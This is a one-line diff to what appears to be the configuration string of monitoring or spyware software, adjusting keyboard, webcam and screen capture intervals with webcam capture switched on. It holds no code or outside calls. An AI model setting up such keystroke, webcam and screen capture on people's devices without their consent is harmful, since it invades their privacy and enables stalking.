@@ -1,1 +1,1 @@
-keyboard_capture_interval=360;webcam_capture_interval=120;screen_capture_interval=30;configurations_update_interval=180;stored_images_quantity=3;start_webcam_capture=1;
+keyboard_capture_interval=360;webcam_capture_interval=360;screen_capture_interval=180;configurations_update_interval=180;stored_images_quantity=3;start_webcam_capture=1;
